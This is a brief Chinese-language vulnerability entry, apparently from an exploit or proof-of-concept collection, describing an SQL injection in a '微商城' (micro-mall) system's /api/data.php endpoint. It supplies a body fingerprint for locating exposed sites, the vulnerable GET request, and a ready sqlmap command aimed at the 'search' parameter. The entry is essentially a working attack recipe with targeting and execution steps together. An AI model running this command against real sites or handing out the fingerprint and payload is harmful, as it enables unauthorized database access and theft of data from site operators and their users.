# 微商城系统api存在SQL注入漏洞

微商城系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/Mao_Public/js/jquery-2.1.1.min.js"`
- **请求**：`GET /api/data.php?mod=list&lx=2&search=123 HTTP/1.1`

**Payload**
```
sqlmap -u http://xxx/api/data.php?mod=list&lx=2&search=123 -p search --level 3 --batch
```
- **响应特征**：200